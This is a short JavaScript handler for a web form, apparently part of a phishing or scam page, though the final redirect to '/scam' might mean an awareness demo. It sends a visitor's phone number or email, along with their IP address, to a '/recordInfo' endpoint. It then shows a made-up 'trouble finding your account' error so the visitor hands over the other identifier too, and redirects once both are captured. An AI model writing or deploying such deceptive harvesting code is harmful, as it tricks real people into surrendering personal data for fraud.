function next(){
    event.preventDefault();
    let phone = window.phonePattern.test($("#phone").val());
    let email = window.emailPattern.test($("#phone").val());
    if((phone&&!window.gavePhone)||(email&&!window.gaveEmail)){
        if(phone) window.gavePhone = true;
        if(email) window.gaveEmail = true;
        document.querySelector(".phonebtn").innerHTML += '&nbsp;<span class="spinner-border spinner-border-sm" role="status"></span>';
        // Generate Request
        let fetch_body = {
            ip: window.ip
        };
        fetch_body[phone ? "phone" : "email"] = $("#phone").val();
        fetch("/recordInfo",{
            method: "PUT",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(fetch_body)
        })
        if(window.gaveEmail && window.gavePhone){
            this.location.replace("/scam");
            return false;
        }
        window.setTimeout(function(){
            let txt = "Sorry, but we're having some trouble finding your account.<br> Please use your " + (phone ? "email" : "phone number") + " instead";
            $("#err").css("color","black");
            $("#err").html(txt);
            $("#err").removeClass("d-none");
            document.querySelector(".phonebtn").innerHTML = "Search"; 
        }, 750);
    } else {
        //invalid phone number
    }
    return false;
}